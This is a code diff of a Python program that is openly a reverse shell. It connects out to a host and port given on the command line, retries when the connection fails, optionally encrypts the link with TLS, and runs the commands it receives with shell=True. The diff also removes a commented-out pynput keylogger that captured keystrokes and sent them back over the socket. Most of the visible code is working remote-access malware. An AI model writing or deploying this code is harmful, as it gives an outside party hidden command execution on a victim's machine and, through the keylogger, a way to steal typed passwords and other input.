@@ -18,7 +18,7 @@ import time
 import argparse
 import ssl
 import sys
-#import pynput.keyboard
+
 
 def parse_args():
     """Define host and port variables with optional ssl"""
@@ -26,11 +26,11 @@ def parse_args():
     parser = argparse.ArgumentParser(description="Python remote tcp client")
     parser.add_argument("host", help="Remote host name to connect to")
     parser.add_argument("port", help="Remote port to connect to", type=int)
-    parser.add_argument("--ssl", help="Enable TLS encryption", action="store_true")
+    parser.add_argument("--tls", help="Enable TLS encryption", action="store_true")
 
     # Array of parsed arguments (host, port, encryption)
     args = parser.parse_args()
-    host, port, enc = args.host, args.port, args.ssl
+    host, port, enc = args.host, args.port, args.tls
     return host, port, enc
 
 
@@ -48,64 +48,13 @@ def connect(host, port, enc=False):
                 context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                 context.set_ciphers('DHE-RSA-AES256-SHA256')
                 context.load_dh_params("dhparam.pem")
-                context.load_cert_chain("server.crt", "server.key")
+                context.load_cert_chain(certfile="server.crt", keyfile="server.key")
                 s = context.wrap_socket(s, do_handshake_on_connect=True)
             s.connect((host, port))
             return s
 
         except:
             time.sleep(5)
-
-# def KeyEvent(event):
-#     global strKeyLogs  # List to store logged keys
-#
-#     try:
-#         strKeyLogs # Make sure variable is defined
-#     except NameError:
-#         strKeyLogs = ""
-#
-#     if event == Key.backspace:
-#         strKeyLogs += "[Back] "
-#     elif event == Key.enter:
-#         strKeyLogs += "\n"
-#     elif event == Key.space:
-#         strKeyLogs += " "
-#     elif type(event) == Key:
-#         strKeyLogs += " [" + str(event)[4:] + "] " # if the character is an unknown special key
-#     else:
-#         strKeyLogs += str(event)[1:len(str(event)) - 1] # Remove quotes
-#
-#
-# def keylogger(option, s):
-#     global strKeyLogs
-#
-#     if option == "start":
-#         if not KeyListener.running:
-#             KeyListener.start()
-#             s.send(str.encode("Success!"))
-#         else:
-#             s.send(str.encode("Error!"))
-#     elif option == "stop":
-#         if KeyListener.running:
-#             KeyListener.stop()
-#             strKeyLogs = "" # Clear keylog
-#             s.send(str.encode("Success!"))
-#         else:
-#             s.send(str.encode("Error!"))
-#     elif option == "dump":
-#         if not KeyListener.running:
-#             s.send(str.encode("Error!"))
-#         else:
-#             if strKeyLogs == "":
-#                 s.send(str.encode("Error! Nothing to dump"))
-#             else:
-#                 #s.send(str.encode(str(len(strKeyLogs)))) # Send length of buffer
-#                 s.send(str.encode(strKeyLogs)) # Dump keystrokes
-#                 strKeyLogs = "" # Clear keys
-#
-#
-# KeyListener = pynput.keyboard.Listener(on_press=KeyEvent)
-# Key = pynput.keyboard.Key
 
 
 
@@ -114,19 +63,13 @@ def serve_shell(s):
 
     # Standard reverse shell
     while True:
-        data = s.recv(1024)
-        if data[:2].decode("utf-8") == 'cd':
-            os.chdir(data[3:].decode("utf-8").strip())
-        elif data[:4].decode("utf-8").strip() == "kill":
+        data = s.recv(1024).decode("utf-8")
+        if data[:2] == 'cd':
+            os.chdir(data[3:].strip())
+        elif data[:4].strip() == "kill":
             break
-        # elif data[:5].decode("utf-8").strip() == "start":
-        #     keylogger("start", s)
-        # elif data[:5].decode("utf-8").strip() == "stop":
-        #     keylogger("stop", s)
-        # elif data[:5].decode("utf-8").strip() == "dump":
-        #     keylogger("dump", s)
         if len(data) > 0:
-            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True,
+            cmd = subprocess.Popen(data[:], shell=True,
                                    stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
 
